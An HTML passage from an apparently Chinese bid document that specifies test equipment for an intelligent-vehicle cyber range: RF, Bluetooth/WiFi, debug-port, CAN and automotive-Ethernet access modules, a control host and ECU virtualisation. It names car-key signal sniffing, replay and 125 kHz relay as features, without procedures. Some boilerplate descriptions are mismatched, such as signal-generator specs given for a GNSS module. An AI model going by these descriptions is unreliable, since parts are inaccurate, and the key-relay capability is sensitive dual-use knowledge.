title="方案"></a>方案</h4><p>GNSS（全球导航卫星系统）接入模块是一种用于接收和处理全球定位系统（GPS）、伽利略系统（Galileo）、格洛纳斯系统（GLONASS）或其他卫星导航系统信号的设备。它通常用于移动设备、车辆导航系统、无人机、船舶和其他需要定位和导航功能的应用中。</p><p>GNSS接入模块的主要功能是接收卫星发射的导航信号，并计算出设备的位置、速度和时间信息，频率范围介于8kHz至3GHz或6GHz、输出功率+33dBm、1GHz调制带宽，支持北斗、GPS、GLONASS、Galileo卫星型号频段。</p><p>它由以下几个组件组成：</p><p>1. 天线：用于接收卫星信号的天线，通常是一个小型的陶瓷或金属天线。</p><p>2. 接收机：接收机负责接收天线接收到的信号，并进行信号处理和解码。它将接收到的信号转换为数字信号，并提供给后续的计算单元进行位置计算。</p><p>3. 计算单元：计算单元是GNSS接入模块的核心部分，它使用接收到的卫星信号进行位置计算。计算单元通常由处理器、存储器和算法组成，可以进行复杂的信号处理和定位算法运算。</p><p>4. 接口：GNSS接入模块通常提供多种接口，以便与其他设备进行通信。常见的接口包括串行接口（如UART）、USB、SPI和I2C等。</p><p>GNSS接入模块的工作原理是通过接收多颗卫星发射的信号，并利用三角测量原理计算设备的位置。接收到的卫星信号包含了卫星的位置和时间信息，通过同时接收多颗卫星的信号，并利用这些信息进行计算，可以确定设备的精确位置。</p><p>在初始化配置阶段，用户需要对GNSS模块进行配置管理。这包括设置GNSS模块的参数、协议、频率等以满足特定的靶场测试需求。在靶场系统投入使用后，用户可以根据需要将设备的使用权分配给不同的靶场测试环境。</p><p>可用于管理与使用权分配功能，在靶场系统启用前的初始化配置阶段对设备进行配置管理，在靶场投入使用后用户可以分配设备的使用权给不同的靶场测试环境。</p><h4 id="产品手册-3"><a href="#产品手册-3" class="headerlink" title="产品手册"></a>产品手册</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a15d1a14773d6b75167befa39e5270ba.jpeg" alt="矢量信号发生器SMBV100B_00"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/baa2b22a8f1e6ed2290faa7faefc6626.jpeg" alt="矢量信号发生器SMBV100B_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7e5315358e8386ee493a1f5936a02ecf.jpeg" alt="矢量信号发生器SMBV100B_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2f2b5d5f7f6de3bfab908ab47db1c09d.jpeg" alt="矢量信号发生器SMBV100B_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/945d2c517eb0190dc0875b7d16a11cd6.jpeg" alt="矢量信号发生器SMBV100B_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/89ed9b8f249d64c67db48e15a748390a.jpeg" alt="矢量信号发生器SMBV100B_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/15f70ba52aa095a12862c0f436962374.jpeg" alt="矢量信号发生器SMBV100B_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/76170dd77847e32bb3423007d24930ca.jpeg" alt="矢量信号发生器SMBV100B_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/159dc7425d49b992d0077448628bb528.jpeg" alt="矢量信号发生器SMBV100B_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/81313bd6b83464f515c62c09d3b26606.jpeg" alt="矢量信号发生器SMBV100B_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/07392bb5678e2ffe3244fe6a6a4c5b91.jpeg" alt="矢量信号发生器SMBV100B_10"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0f3aa80c79f79c040062dcca1a30b0da.jpeg" alt="矢量信号发生器SMBV100B_11"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e05cca7cd803e37bcc1937ad22562f6b.jpeg" alt="矢量信号发生器SMBV100B_12"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a73867bbd86e2f8c5083aff598b3de4e.jpeg" alt="矢量信号发生器SMBV100B_13"></p><h3 id="射频及无线电接入模块"><a href="#射频及无线电接入模块" class="headerlink" title="射频及无线电接入模块"></a>射频及无线电接入模块</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：R4000</p><p>数量：5套</p><p>指标参数信息如下：</p><ol><li>提供315HMz、433MHz、868MHz、915MHz等频段的车辆常用高频段信号接入；</li><li>提供以上车辆常用高频段信号的嗅探、录制、重放功能；</li><li>提供汽车钥匙125K低频信号的中继功能；</li><li>与配套台架绑定使用权限功能，在靶场系统启用前的初始化配置阶段对设备进行配置管理，在靶场投入使用后可在对应的台架/车型测试环境中配置与使用设备；</li><li>内置上位机，满足Intel 4核i5 10代或更新处理器，内存8GB，存储250G SSD。</li></ol><h4 id="方案-6"><a href="#方案-6" class="headerlink" title="方案"></a>方案</h4><p>射频（Radio Frequency）和无线电接入模块是用于接收和发送无线电信号的设备。它们在无线通信、无线数据传输和无线控制系统中起着重要的作用。这些模块通常包括射频收发器、天线、接收机和发送机等组件。</p><p>射频接收模块的主要功能是接收来自外部的无线电信号，并将其转换为可处理的基带信号。它通常包括以下组件：</p><p>1. 天线：用于接收无线电信号的天线。天线的设计和性能对接收信号的质量和范围有着重要影响。</p><p>2. 射频收发器：射频收发器负责接收天线接收到的信号，并进行射频信号的放大、滤波和混频等处理。它将射频信号转换为中频信号或基带信号，以供后续处理。</p><p>3. 接收机：接收机进一步处理中频信号或基带信号，进行信号解调、滤波和解码等操作。它将接收到的信号转换为数字信号，以供后续的数字处理单元进行处理。</p><p>射频发送模块的主要功能是将数字信号转换为无线电信号，并通过天线发送出去。它通常包括以下组件：</p><p>1. 数字处理单元：数字处理单元接收来自其他设备或系统的数字信号，并进行调制、编码和滤波等处理，将数字信号转换为模拟信号。</p><p>2. 发送机：发送机接收数字处理单元输出的模拟信号，并进行射频信号的放大、滤波和混频等处理。它将模拟信号转换为射频信号，并通过天线发送出去。</p><p>射频和无线电接入模块的应用广泛，包括无线通信系统（如移动通信、卫星通信）、无线数据传输（如Wi-Fi、蓝牙）和无线控制系统（如遥控器、无线传感器网络）等。它们在不同的频段和协议下工作，可以实现远距离通信、高速数据传输和多设备之间的无线连接。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/37c26242703ade24bcb8c487bc37199e.png"></p><p>R4000射频及无线接入模块能够接入315HMz、433MHz、868MHz、915MHz等频段的车辆常用高频段信号，具备车辆常用高频段信号的嗅探、录制、重放功能，具备汽车钥匙125K低频信号的中继功能。</p><p>射频及无线接入模块确保设备与台架的匹配：不同的台架或车型测试环境可能有不同的射频和无线接入需求。提高设备安全性：通过绑定使用权限，可以限制设备的使用范围，减少未经授权的访问和操控。简化设备管理：通过绑定使用权限功能，可以将设备与台架或车型测试环境进行关联，使得设备管理更加简便。</p><h3 id="蓝牙-WiFi接入模块"><a href="#蓝牙-WiFi接入模块" class="headerlink" title="蓝牙/WiFi接入模块"></a>蓝牙/WiFi接入模块</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：RT8611</p><p>数量：5套</p><p>指标参数信息如下：</p><ol><li>支持2.4G和5G双频，支持802.11a/b/g/n/ac协议；</li><li>每套接入模块支持8个适配器；</li><li>每个配备一根5db全向天线，采用3×3MU-MIMO设计，保证接入信号质量；</li><li>支持AP模式和STA模式，截图如下所示；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8ee0e43898d913146157d3256c79c747.png"></p><ol><li><p>与配套台架绑定使用权限功能，在靶场系统启用前的初始化配置阶段对设备进行配置管理，在靶场投入使用后可在对应的台架/车型测试环境中配置与使用设备。</p><p>蓝牙模块：</p></li><li><p>支持低功率蓝牙和标准蓝牙协议；</p></li><li><p>每套接入模块支持8个适配器；</p></li><li><p>每个配备一根5db全向天线，采用3×3MU-MIMO设计，保证接入信号质量；</p></li><li><p>与配套台架绑定使用权限功能，在靶场系统启用前的初始化配置阶段对设备进行配置管理，在靶场投入使用后可在对应的台架/车型测试环境中配置与使用设备；</p></li><li><p>内置上位机，Intel 4核i5 10代或更新处理器，内存8GB，存储250G SSD。</p></li></ol><h4 id="方案-7"><a href="#方案-7" class="headerlink" title="方案"></a>方案</h4><p>蓝牙接入模块是一种用于实现蓝牙无线通信的设备。蓝牙技术是一种短距离无线通信技术，它可以在数米到几十米的范围内实现设备之间的无线通信和数据传输。蓝牙接入模块通常包括蓝牙收发器、天线和相关的电路和接口。</p><p>蓝牙接入模块的主要功能是接收和发送蓝牙信号，实现设备之间的无线通信。它通常包括以下组件：</p><p>1. 蓝牙收发器：蓝牙收发器是蓝牙接入模块的核心部分，它负责处理蓝牙信号的调制、解调和编码等操作。蓝牙收发器可以支持不同的蓝牙版本和协议，如蓝牙2.0、蓝牙4.0、蓝牙5.0等。</p><p>2. 天线：天线用于接收和发送蓝牙信号。天线的设计和性能对蓝牙通信的范围和质量有着重要影响。</p><p>3. 电路和接口：蓝牙接入模块通常包括与其他设备连接的电路和接口，如UART、SPI、I2C等。这些接口用于与主控设备（如微处理器、单片机）进行通信，实现数据的传输和控制。</p><p>WiFi接入模块是一种用于实现无线局域网（Wireless Local Area Network，简称WiFi）连接的设备。WiFi技术基于IEEE 802.11标准，可以在较大范围内实现设备之间的无线通信和数据传输。WiFi接入模块通常包括WiFi收发器、天线和相关的电路和接口。</p><p>WiFi接入模块的主要功能是接收和发送WiFi信号，实现设备之间的无线局域网连接。它通常包括以下组件：</p><p>WiFi收发器：WiFi收发器是WiFi接入模块的核心部分，负责处理WiFi信号的调制、解调和编码等操作。WiFi收发器可以支持不同的WiFi标准和频段，如802.11b/g/n/ac/ax等。</p><p>天线：天线用于接收和发送WiFi信号。天线的设计和性能对WiFi通信的范围和质量有着重要影响。</p><p>电路和接口：WiFi接入模块通常包括与其他设备连接的电路和接口，如UART、SPI、I2C等。这些接口用于与主控设备（如微处理器、单片机）进行通信，实现数据的传输和控制。</p><p>我司提供的WiFi模具备8个适配器，配备一根5db全向天线，采用3×3MU-MIMO设计，保证接入信号质量，支持2.4G和5G双频，支持802.11a/b/g/n/ac协议。同时拥有AP模式和STA模式。</p><p>WIFI接入模块可以与配套台架绑定并具有使用权限功能，具备配置管理在靶场系统启用前的初始化配置阶段，并具备在对应台架/车型测试环境中配置和使用设备在靶场系统投入使用后。</p><p>我司提供的蓝牙接入模块具备8个适配器，配备一根5db全向天线，采用3×3MU-MIMO设计，保证接入信号质量，支持低功率蓝牙和标准蓝牙协议。</p><p>蓝牙接入模块可以与配套台架绑定并具有使用权限功能，具备配置管理在靶场系统启用前的初始化配置阶段，并具备在对应台架/车型测试环境中配置和使用设备在靶场系统投入使用后。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dde349cfebf6858c06806381a3726f71.png"></p><h3 id="调试口接入模块"><a href="#调试口接入模块" class="headerlink" title="调试口接入模块"></a>调试口接入模块</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：TS4311</p><p>数量：5套</p><p>指标参数信息如下：</p><ol><li>支持现有、新增台架上的USB、网口调试接口接入及组网；</li><li>程控与测试软件支持ADB、SSH协议；</li><li>与配套台架绑定使用权限功能，在靶场系统启用前的初始化配置阶段对设备进行配置管理，在靶场投入使用后可在对应的台架/车型测试环境中配置与使用设备；</li><li>内置上位机，Intel 4核i5 10代或更新处理器，内存8GB，存储250G SSD。</li></ol><p>性能参数如下：</p><ol><li>每套设备支持6路USB、6路以太网调试接口接入。</li></ol><h4 id="方案-8"><a href="#方案-8" class="headerlink" title="方案"></a>方案</h4><p>调试口接入模块是一种用于连接和调试目标设备的接口模块。它通常用于开发和调试过程中，以便与目标设备进行通信、调试和数据传输。</p><p>调试口接入模块的主要功能是提供一个可编程的接口，使开发人员能够与目标设备进行通信和控制。它通常包括以下组件：</p><p>1. 接口类型：调试口接入模块可以支持多种接口类型，如串口（UART）、以太网口、USB接口等。具体选择取决于目标设备的接口类型和开发人员的需求。</p><p>2. 电路和接口：调试口接入模块通常包括与目标设备连接的电路和接口，如引脚、插座等。这些接口用于与目标设备进行物理连接，以实现数据传输和调试功能。</p><p>3. 控制芯片：调试口接入模块可能会包含一个控制芯片，用于管理和控制与目标设备之间的通信。控制芯片可以提供额外的功能，如信号转换、电平转换、数据缓存等。</p><p>调试口接入模块的设计和功能取决于目标设备的特性和开发人员的需求。它可以用于各种场景，如嵌入式系统开发、单片机调试、硬件调试等。通过调试口接入模块，开发人员可以与目标设备进行通信、调试和数据传输，以便进行软件调试、固件烧录、性能分析等操作。</p><p>调试口接入模块支持现有、新增台架上的USB、网口调试接口接入及组网。调试口接入模块的程控与测试软件支持ADB、SSH协议。</p><p>设备支持6路USB、6路以太网调试接口接入</p><p>调试口接入模块可以与配套台架绑定并具有使用权限功能，具备配置管理在靶场系统启用前的初始化配置阶段，并具备在对应台架/车型测试环境中配置和使用设备在靶场系统投入使用后。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1808d91cfd5100cc8d4e2068e80545cf.png"></p><h3 id="车载网络接入模块"><a href="#车载网络接入模块" class="headerlink" title="车载网络接入模块"></a>车载网络接入模块</h3><h4 id="车载网络测试软件"><a href="#车载网络测试软件" class="headerlink" title="车载网络测试软件"></a>车载网络测试软件</h4><p>功能参数如下：</p><ol><li>我司提供5套永久使用license，支持CAN/ETH；</li><li>自带多种通信数据库编辑器，例如CANdb++支持DBC数据编辑库，Communication Model Editor支持SOA数据模型编辑；</li><li>通过建模进行完整的总线系统仿真和残余总线仿真；</li><li>支持分析总线通信；</li><li>测试完整网络和单个控制单元；</li><li>通过UDS协议，进行诊断通信测试；</li><li>可以创建用户自定义界面来控制仿真和测试过程或显示分析数据；</li><li>提供给用户下面的窗口和模块：；</li><li>支持图形显示和功能模块以及评估功能的参数化测量设置</li><li>支持列出所有的总线活动项，如报文、错误帧和远程帧。对于每一条报文，可以显示独立的信号，支持过滤功能。事件显示项，如错误事件、系统变量、传输协议信息和诊断服务。</li><li>支持信号、变量和诊断参数以图形方式显示在XY图中，可以用来测量和观察曲线，如速度和温度与时间的关系。</li><li>支持显示信号值，以数字形式和柱状图形式呈现</li><li>支持显示报文频率、错误帧、总线负载和控制器状态</li><li>支持报文触发，实时发送修正信号</li><li>支持纪录，后期分析和数据回放</li><li>支持对总线事件的具体响应，减少显示和记录的数据的数量</li><li>支持显示系统报文和用户自定义的输出.</li></ol><h5 id="方案-9"><a href="#方案-9" class="headerlink" title="方案"></a>方案</h5><p>国利CAN总线测试系统是一款广泛应用于汽车行业的开发和测试工具，用于开发、仿真和测试汽车电子系统。它提供了丰富的功能和灵活的配置选项，以支持各种汽车网络和通信协议的开发和测试。可实现以下功能：</p><p>1. 汽车网络仿真：国利CAN总线测试系统支持多种汽车网络协议，如CAN（Controller Area Network）、LIN（Local Interconnect Network）、FlexRay、Ethernet等。它可以模拟这些网络，并生成相应的通信消息，以便对车辆电子系统进行测试和验证。</p><p>2. 通信与诊断：国利CAN总线测试系统提供了丰富的通信和诊断功能，可以与车辆的ECU（Electronic Control Unit）进行通信，并监视和记录通信消息。它支持诊断协议，如UDS（Unified Diagnostic Services）、KWP2000（Keyword Protocol 2000）等，用于诊断车辆系统和读取传感器数据。</p><p>3. 信号和消息编辑：国利CAN总线测试系统允许用户创建和编辑信号和消息，以模拟车辆系统的输入和输出。用户可以定义信号的值、周期和触发条件，以生成各种测试场景和数据。</p><p>4. 功能和性能测试：国利CAN总线测试系统提供了测试框架和功能，用于执行功能和性能测试。用户可以创建测试用例、定义测试参数和期望结果，并自动执行测试过程。CANoe还提供了丰富的分析和报告功能，用于评估测试结果和生成测试报告。</p><p>5. 仿真和模型集成：国利CAN总线测试系统可以与其他仿真和建模工具集成，如MATLAB/Simulink、dSPACE等。这使得开发人员可以在CANoe中使用仿真模型，并与实际车辆系统进行集成和测试。</p><p>6. 通信总线监测：国利CAN总线测试系统可以监测汽车网络上的通信活动，并提供实时的网络状态和消息跟踪。这对于故障排除和网络性能分析非常有用。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/305711d204642802e766a64a20e6fbd4.png"></p><h4 id="CAN总线接入模块"><a href="#CAN总线接入模块" class="headerlink" title="CAN总线接入模块"></a>CAN总线接入模块</h4><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLPCAN-USB PRO FD</p><p>数量：5套</p><p>指标参数信息如下：</p><ol><li>支持可以配置CAN/CAN-FD波特率以及采样点；</li><li>具备CAN/CANFD总线数据接收和发送的功能；</li><li>支持多路CAN及CANFD，其中高速CAN为60路，CANFD为60路，CAN支持波特率125kbps、250kbps，500kbps，1Mbps，CAN-FD支持波特率2Mbps、5Mbps、8Mbps；</li><li>支持对发送和接收信号进行时间戳记录功能；</li><li>在正常负载下，数据转换延迟时间小于0.3ms；</li><li>可监测错误帧和远程帧；</li><li>确保所有CAN/CANFD通道可以满足100%总线负载；</li><li>具备硬件同步接口，同步精度1μs，可与其他总线接口卡联合使用；</li><li>支持网络测试工具软件。</li></ol><h5 id="方案-10"><a href="#方案-10" class="headerlink" title="方案"></a>方案</h5><p>CAN总线接入模块是一种用于连接和控制CAN（Controller Area Network）总线的接口模块。CAN总线是一种广泛应用于汽车和工业领域的串行通信协议，用于在不同的电子控制单元（ECU）之间传输数据和命令。</p><p>CAN总线接入模块通常具有以下功能和特点：</p><p>1. CAN总线连接：CAN总线接入模块提供了物理接口，用于连接到CAN总线。它可以与CAN总线上的其他设备进行通信，并传输和接收CAN消息。</p><p>2. 数据传输和接收：CAN总线接入模块可以发送和接收CAN消息。它可以将数据封装成CAN消息并发送到总线上，同时也可以监听总线上的消息，并将其解析成可读的数据。</p><p>3. 消息过滤和筛选：CAN总线接入模块通常支持消息过滤和筛选功能。它可以根据消息的标识符（ID）或其他属性，选择性地接收和处理特定的CAN消息。</p><p>4. 速率和波特率控制：CAN总线接入模块可以控制CAN总线的速率和波特率。它可以根据需要调整通信速率，以适应不同的应用场景和网络要求。</p><p>5. 硬件和软件集成：CAN总线接入模块通常具有与其他硬件和软件系统的集成能力。它可以与ECU、计算机、测试设备等进行连接，并与其他系统进行数据交换和通信。</p><p>6. 数据分析和诊断：一些CAN总线接入模块提供了数据分析和诊断功能。它们可以监视CAN总线上的通信活动，记录和分析CAN消息，并帮助用户进行故障排除和系统调试。</p><p>CAN总线接入模块在汽车和工业领域中广泛应用于开发、测试和诊断CAN总线系统。它们为工程师和技术人员提供了一种便捷的方式来连接和控制CAN总线，并实现数据传输、消息监控和系统分析。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/92348e3895e7cde54b1d86076ccfb383.png"></p><h4 id="车载以太网接入模块"><a href="#车载以太网接入模块" class="headerlink" title="车载以太网接入模块"></a>车载以太网接入模块</h4><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLPETH-USB PRO T1</p><p>数量：5套</p><p>指标参数信息如下：</p><ol><li>支持30通道的100BASE-T1/1000BASE-T1（OPENAllianceBroadR-Reach）；</li><li>支持60通道的标准以太网（10BASE-T/100BASE-TX/1000BASE-T）；</li><li>支持10个独立的CAN/CANFD通道（通过1xD-SUB9提供）；</li><li>支持IO接口，用于设置或采样模拟/数字值；</li><li>通过USB3.0连接主机；</li><li>以太网帧的高分辨率时间戳；</li><li>CAN/CANFD帧的高分辨率时间戳；</li><li>多个网络接口的软件和硬件时间同步；</li><li>内部三向路由in/monitor/out；</li><li>以太网和CAN数据的硬件过滤；</li><li>集成的Layer2交换机，用于优化多个通道的残余总线仿真；</li><li>用于低抖动和全带宽的硬件负载发生器；</li><li>独立模式功能，可确保不间断运行；</li><li>适用于汽车和工业应用的稳定性，供电和温度范围；</li><li>对于第三方工具的开放接口，可使用XL驱动程序库（CAN和以太网）。</li><li>支持网络测试工具软件。</li></ol><p>备注：为保证任务并行执行，通道硬件分配方案须在中标后取得客户同意。</p><h5 id="方案-11"><a href="#方案-11" class="headerlink" title="方案"></a>方案</h5><p>车载以太网接入工具是一种用于在汽车中实现以太网连接的设备或工具。以太网是一种常用的局域网通信协议，它提供高速、可靠的数据传输能力，广泛应用于计算机网络中。在车辆领域，车载以太网接入工具允许车辆和乘客通过无线网络访问互联网，享受各种在线服务和功能。</p><p>以下是对车载以太网接入工具的描述：</p><p>1. 网络连接：车载以太网接入工具提供了连接到车辆以太网的能力。它可以通过有线或无线方式与车辆的以太网网络进行连接，实现车辆与外部网络的通信。</p><p>2. 高速数据传输：车载以太网接入工具支持高速数据传输，可以提供较高的带宽和传输速度。这使得车辆和乘客可以快速地访问互联网，享受流畅的在线娱乐、导航和通信体验。</p><p>3. 多设备连接：车载以太网接入工具通常支持多设备连接。它可以同时连接多个设备，如智能手机、平板电脑、车载娱乐系统等，使多个用户可以同时访问互联网。</p><p>4. 安全性和隐私保护：车载以太网接入工具通常具有安全性和隐私保护功能。它可以支持加密通信和身份验证，确保数据传输的安全性。同时，它也可以提供隐私保护措施，防止未经授权的访问和信息泄露。</p><p>5. 车载应用和服务：车载以太网接入工具可以为车辆提供各种车载应用和服务。它可以连接到车辆的娱乐系统、导航系统、车载诊断系统等，实现在线地图更新、远程诊断、软件升级等功能。</p><p>6. 数据采集和分析：车载以太网接入工具还可以用于数据采集和分析。它可以收集车辆的运行数据、传感器数据等，并将其上传到云端或其他远程服务器进行分析和处理。</p><p>车载以太网接入工具是一种使车辆能够连接到互联网的设备或工具。它提供了高速数据传输、多设备连接、安全性和隐私保护等功能，为车辆和乘客提供了丰富的在线服务和功能。车载以太网接入工具在现代车辆中越来越普遍，为车辆的互联网连接和智能化提供了重要的支持。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/23d64a54acd7309140901f2a60cd14bd.png"></p><h3 id="程控上位机-1"><a href="#程控上位机-1" class="headerlink" title="程控上位机"></a>程控上位机</h3><p>我司为本项目提供的该产品信息如下：</p><p>品牌：联想</p><p>型号：GeekPro</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/919c76b2bd420e3aa372344593a0804f.png"></p><p>数量：7台</p><p>指标参数信息如下：</p><ol><li>主流工业母版，支持Intel LGA 1700插槽；</li><li>CPU选用Intel 13代 i7或者性能以上的处理器；</li><li>具备3个PCIe插槽；</li><li>具备5个USB接口；</li><li>具备2个千兆网口；</li><li>具备RS232、RS485串口；</li><li>配备32G DDR4 内存；</li><li>配备1T SSD硬盘</li><li>机箱应选用主流4U工业机箱，可上架；</li><li>上位机具备与靶场通信的功能，支持靶场试验控制命令接手、执行及状态反馈；</li><li>支持靶场测试状态的开启与关闭；</li><li>支持自动绑定靶场试验任务；</li><li>支持靶场试验任务的被测件状态采集，测试结果采集，包含零部件网络及进程状态，工具测试报告获取并上传等。</li></ol><h4 id="方案-12"><a href="#方案-12" class="headerlink" title="方案"></a>方案</h4><p>程控上位机是一种通过计算机软件来控制和监控设备的系统。它通常与设备进行通信，通过计算机的界面和功能，实现对设备的远程控制、参数设置、数据采集和分析等操作。</p><p>程控上位机的功能通常包括以下几个方面：</p><p>1. 远程控制：使用程控上位机可以通过计算机软件来远程控制设备的开关、调节参数等操作，方便用户对设备进行控制。</p><p>2. 参数设置：通过程控上位机可以方便地设置设备的工作参数，如电压、电流、频率等，以满足不同的应用需求。</p><p>3. 数据采集与分析：程控上位机可以实时采集设备产生的数据，并提供数据分析功能，如波形显示、数据统计等，方便用户对实验数据进行分析和处理。</p><p>4. 实验控制与自动化：程控上位机可以通过编程和脚本等方式实现实验的自动化控制，例如自动调节设备参数、记录数据、生成报告等。</p><p>5. 远程监控与故障诊断：程控上位机可以实时监控设备的运行状态，并提供故障诊断功能，帮助用户及时发现和解决设备故障。</p><p>该上位机可与靶场通信的功能，支持靶场试验控制命令接手、执行及状态反馈，控制靶场测试状态的开启与关闭，使自动绑定靶场试验任务，同时支持靶场试验任务的被测件状态采集，测试结果采集，包含零部件网络及进程状态，工具测试报告获取并上传等。</p><p>上位机与靶场之间建立网络连接，并使用合适的通信协议进行数据交换。上位机具备解析靶场试验控制命令的能力，并根据命令内容进行相应的操作。上位机在执行试验控制命令后，需要及时向靶场返回执行结果或状态反馈。上位机具备相应的异常处理和容错机制，应对网络通信异常、命令执行失败情况。</p><p>上位机可以接收来自靶场的指令或信号，通过解析命令或检测信号状态，判断是否需要开启靶场测试状态。上位机可以接收来自靶场的指令或信号，检测是否需要关闭靶场测试状态。上位机在支持靶场测试状态的开启与关闭时，具有异常处理和容错机制。上位机加入权限控制、安全验证机制，限制只有具备合法权限的用户。</p><p>上位机中定义靶场试验任务的相关信息，包括任务名称、任务描述、试验参数等。上位机根据不同的触发条件来自动绑定靶场试验任务。当触发条件满足时，上位机自动将靶场试验任务与相关设备或系统进行绑定，如果任务成功绑定，上位机自动启动任务的执行。</p><p>上位机通过与被测件进行通信，获取其状态信息；监控测试过程中产生的数据和结果；通过网络监测工具或自定义的程序，对靶场试验中涉及的零部件网络和进程进行状态监测。上位机与测试工具进行集成，自动获取工具生成的测试报告。</p><p>总之，程控上位机通过计算机软件的界面和功能，提供了方便、灵活、智能化的设备控制和监控手段，广泛应用于实验室、工业自动化、生产线等领域。</p><h3 id="零部件虚拟化接入模块"><a href="#零部件虚拟化接入模块" class="headerlink" title="零部件虚拟化接入模块"></a>零部件虚拟化接入模块</h3><p>功能参数如下：</p><ol><li>支持AUTOSAR Classic纯应用层测试模拟、AUTOSAR Classic包含部分协议栈测试模拟以及AUTOSAR Adaptive包含部分协议栈测试模拟，适配于各种基于AUTOSAR协议的嵌入式软件模拟；</li><li>对BSW高度仿真，支持对BSW层中通讯、诊断、EcuM、服务映射和任务映射经进行调整与修改；</li><li>支持网络模拟，可以方便地对网络进行模拟，并且将现有的总线控制器映射到模拟网络中，也可以将其他节点如DLL或是程序集加入模拟网络中；</li><li>支持为不同的目标平台提供虚拟被测系统，如主流的Windows、Linux等；</li><li>支持将虚拟ECU生成可直接从车载网络测试软件中加载的建模库，快速搭建虚拟ECU模型；</li><li>支持将虚拟ECU生成独立SUT用例，允许虚拟ECU在其自己的进程中进行使用；</li><li>支持多种编译器及版本进行虚拟被测系统项目的编译，如Visual Studio 2019、Visual Studio 2017以及CMAKE；</li><li>支持QEMU的SIL套件适配器与QEMU集成，支持与仿真目标的联合仿真；</li><li>可将虚拟CAN（控制器局域网）接口(SocketCAN)连接到SIL CAN总线；</li><li>支持与车载总线测试系统的联合测试。</li></ol><h4 id="方案-13"><a href="#方案-13" class="headerlink" title="方案"></a>方案</h4><p>零部件虚拟化技术是一种将车辆零部件转化为虚拟实体的技术。它通过软件模拟和仿真的方式，将实际的硬件零部件虚拟化为虚拟的、可操作的实体，使其在计算机系统中以虚拟的形式存在和运行。</p><p>1. 虚拟化原理：零部件虚拟化技术基于虚拟化原理，利用虚拟机监视器（VMM）或虚拟化层，将物理零部件的功能和特性抽象出来，并在虚拟环境中模拟其行为。这样，软件可以通过虚拟接口与虚拟零部件进行交互，而无需直接访问实际的硬件。</p><p>2. 虚拟化技术应用：零部件虚拟化技术可以应用于多个领域和应用场景。在汽车领域，它可以用于虚拟化车辆的各种电子控制单元（ECU），如发动机控制单元、车身控制单元等。通过虚拟化这些ECU，可以实现更灵活的软件开发、测试和部署，提高系统的可靠性和可维护性。</p><p>3. 软件定义的零部件：零部件虚拟化技术使得零部件可以以软件定义的方式存在。通过虚拟化，可以将多个实际的硬件零部件抽象为一个虚拟零部件，或者将一个实际的硬件零部件分割为多个虚拟零部件。这种软件定义的零部件可以根据需求进行灵活配置和管理，提高系统的可扩展性和适应性。</p><p>4. 功能隔离和安全性：通过零部件虚拟化技术，可以实现不同零部件之间的功能隔离和安全性。虚拟化技术可以将不同的虚拟零部件隔离运行，防止彼此之间的干扰和冲突。同时，虚拟化技术也可以提供安全性措施，保护虚拟零部件的数据和操作免受未经授权的访问和攻击。</p><p>5. 性能和效率：零部件虚拟化技术可以提高系统的性能和效率。通过虚拟化，可以实现对虚拟零部件的资源分配和管理，优化资源利用率，提高系统的运行效率。此外，虚拟化技术还可以实现动态的资源调整和负载均衡，提高系统的可伸缩性和稳定性。</p><p>零部件虚拟化技术通过将车载零部件虚拟化为虚拟实体，提供了更灵活、可扩展和安全的系统设计和管理方式。它在汽车领域和其他领域中有着广泛的应用，为系统开发、测试和部署带来了许多优势。。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5cf8b070788a03ad993d46dd9ecb7a6d.png"></p><h1 id="智能汽车网络靶场动态测试接入网关"><a href="#智能汽车网络靶场动态测试接入网关" class="headerlink" title="智能汽车网络靶场动态测试接入网关"></a>智能汽车网络靶场动态测试接入网关</h1><h2 id="智能汽车网络靶场动态测试接入网关-1"><a href="#智能汽车网络靶场动态测试接入网关-1" class="headerlink" 